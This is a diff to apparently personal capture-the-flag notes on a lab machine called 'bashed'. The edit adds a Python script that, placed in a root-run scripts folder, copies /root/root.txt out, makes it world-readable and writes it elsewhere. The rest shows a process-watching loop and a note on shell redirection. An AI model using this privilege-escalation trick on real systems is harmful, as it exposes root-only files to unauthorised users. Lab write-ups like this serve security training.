@@ -65,9 +65,12 @@ Start http server on LHOST
 
   Make script copy.py and put in upload with wget like before:
 
-  from shutil import copyfile
+  import os
 
-  copyfile(/root/root.txt, /tmp/root.txt)
+  # Unix
+  os.popen('cp /root/root.txt /tmp/root.txt')
+  os.popen('chmod 777 /tmp/root.txt | cat /tmp/root.txt | tee /scripts/key.txt')
+
 
   scriptmanager@bashed:/var/www/html/uploads$ cp copy.py /scripts/copy.py
 
@@ -90,3 +93,6 @@ while true; do
     sleep 1
     old_process=$new_process
 done
+
+--------------
+`cat /root/root.txt > myownfile.txt` replaces the content, `cat /root/root.txt >> myownfile.txt` appends
